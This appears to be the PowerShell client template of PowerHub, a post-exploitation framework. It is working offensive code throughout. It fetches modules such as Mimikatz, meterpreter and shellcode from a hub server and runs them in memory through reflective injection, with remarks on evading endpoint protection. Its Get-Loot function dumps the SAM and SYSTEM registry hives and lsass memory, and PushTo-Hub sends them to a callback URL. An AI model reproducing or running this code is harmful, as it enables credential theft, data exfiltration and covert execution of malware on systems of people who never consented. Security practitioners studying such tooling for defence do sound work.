Write-Output @"
  _____   _____  _  _  _ _______  ______ _     _ _     _ ______
 |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
 |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
                            written by Adrian Vollmer, 2018-2020
Run 'Help-PowerHub' for help
"@

$CALLBACK_URL = ${{symbol_name("CALLBACK_URL")}}
$KEY = ${{symbol_name("KEY")}}
$WebClient = ${{symbol_name("WebClient")}}
Set-Alias -Name Decrypt-Code -Value {{symbol_name("Decrypt-Code")}}
Set-Alias -Name Decrypt-String -Value {{symbol_name("Decrypt-String")}}
Set-Alias -Name Transport-String -Value {{symbol_name("Transport-String")}}

$WEBDAV_URL = "{{webdav_url}}"
$ErrorActionPreference = "Stop"
$PS_VERSION = $PSVersionTable.PSVersion.Major
{{'$DebugPreference = "Continue"'|debug}}

function Unzip-Code {
     Param ( [byte[]] $byteArray )
     if ($PS_VERSION -eq 2) {
        $byteArray
     } else {
         $input = New-Object System.IO.MemoryStream( , $byteArray )
         $output = New-Object System.IO.MemoryStream
         $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
         $gzipStream.CopyTo( $output )
         $gzipStream.Close()
         $input.Close()
         [byte[]] $byteOutArray = $output.ToArray()
         $byteOutArray
    }
}

function Update-HubModules {
    $ModuleList = Transport-String "ml"
    Invoke-Expression $ModuleList
    $Global:Modules = $Modules
}

function Import-HubModule {

    Param(
        [parameter(Mandatory=$true)]
        $Module
    )

    $code = $Module.Code
    $sb = [Scriptblock]::Create($code)
    New-Module -ScriptBlock $sb | Out-Null

    if ($?){
        Write-Verbose ("[*] {0} imported." -f $Module.Name)
    } else {
        Write-Error ("[*] Failed to import {0}" -f $Module.Name)
    }
}


function Convert-IntStringToArray ($s) {
    $no = $s.Split(",")
    $indices = @()
    foreach ($t in $no) {
        $limits = $t.Split("-")
        if ($limits.Length -eq 1) {
            $indices += [Int]$limits[0]
        } else {
            if (-not $limits[0]) { $limits[0] = 0}
            if (-not $limits[1]) { $limits[1] = $Modules.length-1}
            $indices += [Int]($limits[0]) .. [Int]($limits[1])
        }
    }
    $indices
}

function List-HubModules {
<#
.SYNOPSIS

Lists all modules that are available via the hub.

#>
    # $Modules | Out-String
    $Modules | Format-Table -AutoSize -Property N,Type,Name,Loaded
}

function Get-HubModule {
<#
.SYNOPSIS

Simply returns a hub module for further processing. Its only parameter  works
similar to Load-HubModule. In fact, Load-HubModule calls Get-HubModule.

.PARAMETER Expression

See help of Load-HubModule.

#>
    Param(
        [parameter(Mandatory=$true)]
        [String]
        $Expression
    )

    if ($Expression -match "^[0-9-,]+$") {
        $indices = Convert-IntStringToArray($Expression)
    } else {
        $indices = $Modules | Where { $_.Name -match $Expression } | % {$_.N}
    }

    $result = @()
    foreach ($i in $indices) {
        if ($i -lt $Modules.length -and $i -ge 0) {
            $result += $Modules[$i]
        }
    }
    return $result
}

function Load-HubModule {
<#
.SYNOPSIS

Transfers a module from the hub and imports it. It creates a web request to
load the Base64 encoded module code.

It refreshes the module list first, so keep this in mind when referring to
modules by number.

.DESCRIPTION

Load-HubModule loads a module.

.PARAMETER Expression

A regular expression. PowerHub will then load all modules that have a matching
Name.

Alternatively, you can use the number of the module, separated by commas. Can
contain a range such as "1,4-8".


.EXAMPLE

Load-HubModule "3"

Description
-----------
Transfers the code of module #3 from the hub and imports it.

.EXAMPLE

Load-HubModule Mimikatz

Description
-----------
Transfers the code of module 'Invoke-Mimikatz.ps1' (because the regular
expression matches) from the hub and imports it.

.EXAMPLE

Load-HubModule "1,4-6"

Description
-----------
Transfers the code of modules #1, #4, #5 and #6 from the hub and imports them.

.EXAMPLE

Load-HubModule "-"

Description
-----------
Transfers the code of all modules from the hub and imports them.

.NOTES

Use the '-Verbose' option to print detailed information.
#>

    Param(
        [parameter(Mandatory=$true)]
        [String]
        $Expression
    )

    $result = @()
    Get-HubModule $Expression | % {
        $args = @{"m"=$_.N}
        # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
        if ($_.Type -eq 'ps1') {
            $_.Code = Transport-String "m" $args
            Import-HubModule $_
        } else {
            $_.Code = Transport-String "m" $args $True
        }
        $_.Loaded = $True
        $result += $_
    }
    $result
}


function Run-Exe {
<#
.SYNOPSIS

Executes a loaded exe module in memory using Invoke-ReflectivePEInjection, which must be loaded first.

.PARAMETER Module

A PowerHub module object of type 'exe'.

.PARAMETER ExeArgs

A string containing arguments which are passed to the exe module.

.PARAMETER OnDisk

If this switch is enabled, the exe module will be copied to disk and executed conventionally.

WARNING: Endpoint protection WILL catch malware this way.

.EXAMPLE

Run-Exe $hubModule

Description
-----------

Execute some Hub Module of type 'exe' in memory.

.EXAMPLE

Load-HubModule meterpreter.exe | Run-Exe

Description
-----------

Load the exe module with the name 'meterpreter.exe' in memory and run it.

.EXAMPLE

Get-HubModule procdump64 | Run-Exe -ExeArgs "-accepteula -ma lsass.exe lsass.dmp"

Description
-----------

Run the binary whose name matches 'procdump64' in memory and dump the lsass process.
#>
    Param(
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
        [PSTypeName("PowerHub.Module")] $Module,

        [parameter(Mandatory=$false,Position=1)] [String] $ExeArgs,

        [parameter(Mandatory=$false)] [Switch] $OnDisk
    )

    if ($OnDisk) {
        foreach ($m in $Module) {
            $Filename = Save-HubModule $m -Directory $env:TMP
            if ($ExeArgs) {
                Start-Process -FilePath "$Filename" -ArgumentList "$ExeArgs"
            } else {
                Start-Process -FilePath "$Filename"
            }
        }
    } else {
        if (-not (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)) {
            Load-HubModule Invoke-ReflectivePEInjection
        }
        if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue) {
            foreach ($m in $Module) {
                Invoke-ReflectivePEInjection -PEBytes $m.Code -ForceASLR -ExeArgs $ExeArgs
            }
        } else {
            Write-Error "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
        }
    }
}

function Save-HubModule {
<#
.SYNOPSIS

Saves a loaded module to disk. WARNING: This will most likely trigger endpoint protection!

.PARAMETER Module

A PowerHub module object.

.PARAMETER Directory

Directory in which to save the file.

.EXAMPLE

Get-HubModule SeatBelt | Save-HubModule -Directory tmp/

Description
-----------
Save that module whose name matches "SeatBelt" to directory tmp/

.EXAMPLE

Load-HubModule meterpreter.exe | Save-HubModule

Description
-----------

Load the exe module with the name 'meterpreter.exe' in memory and save it to disk
#>
    Param(
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
        [PSTypeName("PowerHub.Module")] $Module,

        [parameter(Mandatory=$false,Position=1)] $Directory = ""
    )

    foreach ($m in $Module) {
        $code = $m.Code
        if ($Directory) {
            $Filename = "$Directory/$($m.BaseName)"
        } else {
            $Filename = $m.BaseName
        }
        if ($m.Type -eq "ps1") {
            $code | Set-Content "$Filename" -Encoding UTF8
        } else {
            $code | Set-Content "$Filename" -Encoding Byte
        }
        $Filename
    }
}

function Run-DotNETExe {
<#
.SYNOPSIS

Executes a .NET exe module in memory, which must be loaded first.

This might trigger the anti-virus.

.PARAMETER Module

A PowerHub module object of type 'exe' (must be a .NET exe).

.EXAMPLE

Load-HubModule SeatBelt | Run-DotNETExe -Arguments "system"

Description
-----------
Load and execute the .NET binary whose name matches "SeatBelt" in memory with
the parameter "system"

.EXAMPLE

Load-HubModule meterpreter.exe | Run-DotNETExe

Description
-----------

Load the .NET module with the name 'meterpreter.exe' in memory and run it
#>

    Param(
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
        [PSTypeName("PowerHub.Module")] $Module,

        [parameter(Mandatory=$false)] [String[]] $Arguments
    )

    foreach ($m in $Module) {
        $code = $m.Code
        $a = [Reflection.Assembly]::Load([byte[]]$code)
        $al = New-Object -TypeName System.Collections.ArrayList
        $al.add($Arguments)
        $a.EntryPoint.Invoke($Null, $al.ToArray());
    }
}


function Run-Shellcode {
<#
.SYNOPSIS

Executes a loaded shellcode module in memory using Invoke-Shellcode, which must be loaded first.

.PARAMETER Module

A PowerHub module object of type "shellcode".

.PARAMETER ProcessID

A process ID of the process to be used for injection.

.EXAMPLE

Run-Shellcode $someModule

Description
-----------
Execute a HubModule of type "shellcode" in memory

.EXAMPLE

Load-HubModule meterpreter.bin | Run-Shellcode

Description
-----------

Load the shellcode module with the name 'meterpreter.bin' in memory and run it
#>
    Param(
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
        [PSTypeName("PowerHub.Module")] $Module,

        [ValidateNotNullOrEmpty()] [UInt16] $ProcessID
    )

    if (-not (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)) {
        Load-HubModule Invoke-Shellcode
    }
    if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
    {
        foreach ($m in $Module) {
            $code = $m.Code
            if ($ProcessID) {
                Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
            } else {
                Invoke-Shellcode -Shellcode $code
            }
        }
    } else {
        Write-Error "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
    }
}


function Send-Bytes {
    Param(
       [Parameter(Mandatory=$True,Position=0)]
       [Byte[]]$Body,

       [Parameter(Mandatory=$False,Position=1)]
       [String[]]$FileName,

       [Parameter(Mandatory=$False)]
       [String] $LootId
    )

    if ($FileName) {
        # remove path
        try {
            $FileName = (Get-Item $Filename).Name
        } catch [System.Management.Automation.ItemNotFoundException] {
            $FileName = $FileName.Replace('^.', '').Replace('\', '_')
        }
    } else {
        $FileName = Get-Date -Format o
    }

    $Body = (Decrypt-Code $Body $KEY)

    if ("{{transport}}" -match "^https?$") {
        Send-BytesViaHttp -LootId $LootId $Body $FileName
    }
}

function Send-BytesViaHttp {
    Param(
       [Parameter(Mandatory=$True,Position=0)]
       [Byte[]]$Body,

       [Parameter(Mandatory=$False,Position=1)]
       [String[]]$FileName,

       [Parameter(Mandatory=$False)]
       [String] $LootId
    )
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $prebody = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file[]`"; filename=`"$FileName`"",
        "Content-Type: application/octet-stream$LF$LF"
    ) -join $LF
    $postbody = "$LF--$boundary--$LF"
    $prebody = [System.Text.Encoding]::UTF8.GetBytes($prebody)
    $postbody = [System.Text.Encoding]::UTF8.GetBytes($postbody)

    $post_url = "$(${CALLBACK_URL})u?script"
    if ($LootId) { $post_url += "&loot=$LootId" }
    {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
    $WebRequest = [System.Net.WebRequest]::Create($post_url)
    $WebRequest.Method = "POST"
    $WebRequest.ContentType = "multipart/form-data; boundary=`"$boundary`""
    $WebRequest.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
    $PostStream = $WebRequest.GetRequestStream()
    $PostStream.Write($prebody, 0, $prebody.Length)
    $PostStream.Write($Body, 0, $Body.Length)
    $PostStream.Write($postbody, 0, $postbody.Length)
    $PostStream.Close()
    {{'Write-Debug "Bytes sent: $($Body.Length)"'|debug}}
    {{'Write-Debug "Reading response"'|debug}}
    try {
        $Response = $WebRequest.GetResponse()
    } catch {}
}


function PushTo-Hub {
<#
.SYNOPSIS

Uploads files back to the hub via Cmdlet.

.PARAMETER Files

An array of strings which contain the names of the files that you want to transfer.

.PARAMETER Name

Filename to be used, if the data is read from stdin. If empty, a combination of
the hostname and a timestamp will be used.

.EXAMPLE

PushTo-Hub kerberoast.txt, users.txt

Description
-----------
Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.

.EXAMPLE

Get-ChildItem | PushTo-Hub -Name "directory-listing"

#>
    Param(
       [Parameter(Mandatory=$False)]
       [String[]]$Files,

       [Parameter(Mandatory=$False)]
       [String[]]$Name,

       [Parameter(Mandatory=$false)]
       [String] $LootId,

       [Parameter(Mandatory=$False,ValueFromPipeline=$True)]
       $Stream
    )

    begin {
        $result = @()
    }
    process {
        $result = $result + $Stream
    }
    end {
        if ($result) {
            {{'Write-Debug "Pushing stdin stream..."'|debug}}
            if ($result.length -ge 1 -and $result[0] -is [System.String]) {
                $result = $result -Join "`r`n"
                $Body = [system.Text.Encoding]::UTF8.GetBytes($result)
            } else {
                $Body = $result | ConvertTo-Json
                $Body = [system.Text.Encoding]::UTF8.GetBytes($Body)
            }
            if (-not $Name) {
                $Name = "{0}_{1}.dat" -f $Env:COMPUTERNAME, (Get-Date -Format o)
            }
            Send-Bytes -LootId $LootId $Body $Name
        } else {
            ForEach ($file in $Files) {
                {{'Write-Debug "Pushing $File..."'|debug}}
                $abspath = (Resolve-Path $file).path
                $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                if ($Name) { $filename = $name } else { $filename = $file }

                Send-Bytes -LootId $LootId $fileBin $filename

            }
        }
    }
}

$global:WebdavLetter = $Null
$global:WebdavRoLetter = $Null

function Mount-Webdav {
<#
.SYNOPSIS

Mount the Webdav drive.

.PARAMETER RoLetter

The letter the mounted read-only drive will receive (default: 'R')

.PARAMETER Letter

The letter the mounted public drive will receive (default: 'S')

#>
    Param(
        [parameter(Mandatory=$False)]
        [String]$Letter = "S",
        [parameter(Mandatory=$False)]
        [String]$RoLetter = "R"
    )
    Set-Variable -Name "WebdavLetter" -Value "$Letter" -Scope Global
    Set-Variable -Name "WebdavRoLetter" -Value "$RoLetter" -Scope Global
    {{'Write-Debug "Mounting $WEBDAV_URL to $LETTER"'|debug}}
    $netout = iex "net use ${Letter}: $WEBDAV_URL /persistent:no 2>&1" | Out-Null
    {{'Write-Debug "Mounting ${WEBDAV_URL}_ro to $RoLETTER"'|debug}}
    $netout = iex "net use ${RoLetter}: ${WEBDAV_URL}_ro /persistent:no 2>&1" | Out-Null
    if (!$?) {
        throw "Error while executing 'net use': $netout"
    }
}


function Unmount-Webdav {
<#
.SYNOPSIS

Unmount the Webdav drive.

#>
    If (${WebdavLetter}) {
        $netout = iex "net use ${WebdavLetter}: /delete 2>&1" | Out-Null
        $netout = iex "net use ${WebdavRoLetter}: /delete 2>&1" | Out-Null
        if (!$?) {
            throw "Error while executing 'net use': $netout"
        }
    } else {
        throw "No Webdav drive mounted"
    }
}


function Get-SysInfo {
<#
.SYNOPSIS

Return some basic information about the underlying system

#>

    $IPs = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress
    $SysInfo = (Get-WMIObject win32_operatingsystem)
    return  New-Object psobject -Property @{
        name = $SysInfo.name.split('|')[0];
        arch = $SysInfo.OSArchitecture;
        version = $SysInfo.version;
        hostname = $SysInfo.csname;
        IPs = $IPs
    }
}


function Get-Loot {
<#
.SYNOPSIS

Grab credentials from the hard drive and from memory.

Partially based on:
    PowerSploit Function: Out-Minidump
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
#>
    $LootId = ""
    1..4 | %{ $LootId += '{0:x}' -f (Get-Random -Max 256) }
    $SysInfo = Get-SysInfo
    $SysInfo.IPs = $SysInfo.IPs -Join " "
    $SysInfo = $SysInfo | ConvertTo-Csv -NoTypeInformation


    $SamPath = Join-Path $env:TMP "sam"
    $SystemPath = Join-Path $env:TMP "system"
    $SecurityPath = Join-Path $env:TMP "security"
    $SoftwarePath = Join-Path $env:TMP "software"
    $DumpFilePath = $env:TMP

    $Process = Get-Process lsass
    $ProcessId = $Process.Id
    $ProcessName = $Process.Name
    $ProcessHandle = $Process.Handle
    $ProcessFileName = "$($ProcessName)_$($ProcessId)_$($LootId).dmp"
    $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName

    try {
        {{'Write-Debug "Dumping Hives..."'|debug}}
        & reg save HKLM\SAM $SamPath /y
        & reg save HKLM\SYSTEM $SystemPath /y
        & reg save HKLM\SECURITY $SecurityPath /y
        & reg save HKLM\SOFTWARE $SoftwarePath /y

        {{'Write-Debug "Dumping lsass to $ProcessDumpPath..."'|debug}}
        & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $ProcessId $ProcessDumpPath full
        {{'Write-Debug "Dumping sysinfo..."'|debug}}
        $SysInfo | PushTo-Hub -Name "sysinfo" -LootId $LootId
        {{'Write-Debug "Sending dumps home..."'|debug}}
        Foreach ($f in $SamPath, $SystemPath, $SecurityPath, $SoftwarePath, $ProcessDumpPath) {
            if (Test-Path $f) { PushTo-Hub -LootId $LootId $f }
        }
    } finally {
        {{'Write-Debug "Deleting dumps..."'|debug}}
        Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
            try { Remove-Item -Force $f} catch {}
        }
    }
}


function Help-PowerHub {
    Write-Host @"
The following functions are available (some with short aliases):
  * List-HubModules (lshm)
  * Load-HubModule (lhm)
  * Get-HubModule (ghm)
  * Update-HubModules (uhm)
  * Get-Loot (glo)
  * Run-Exe (re)
  * Run-DotNETExe (rdne)
  * Run-Shellcode (rsh)
  * PushTo-Hub (pth)
  * Mount-Webdav (mwd)
  * Unmount-Webdav (uwd)

Use 'Get-Help' to learn more about those functions.
"@
}

try { New-Alias -Name pth -Value PushTo-Hub } catch { }
try { New-Alias -Name lhm -Value Load-HubModule } catch { }
try { New-Alias -Name ghm -Value Get-HubModule } catch { }
try { New-Alias -Name lshm -Value List-HubModules } catch { }
try { New-Alias -Name uhm -Value Update-HubModules } catch { }
try { New-Alias -Name glo -Value Get-Loot } catch { }
try { New-Alias -Name re -Value Run-Exe } catch { }
try { New-Alias -Name rdne -Value Run-DotNETExe } catch { }
try { New-Alias -Name rsh -Value Run-Shellcode } catch { }
try { New-Alias -Name mwd -Value Mount-Webdav } catch { }
try { New-Alias -Name umwd -Value Unmount-Webdav } catch { }

Update-HubModules

{{ profile }}

if (${{symbol_name("clip_entry")}}) {
    Invoke-Expression ({{symbol_name("Decrypt-String")}} ${{symbol_name("clip_entry")}})
}
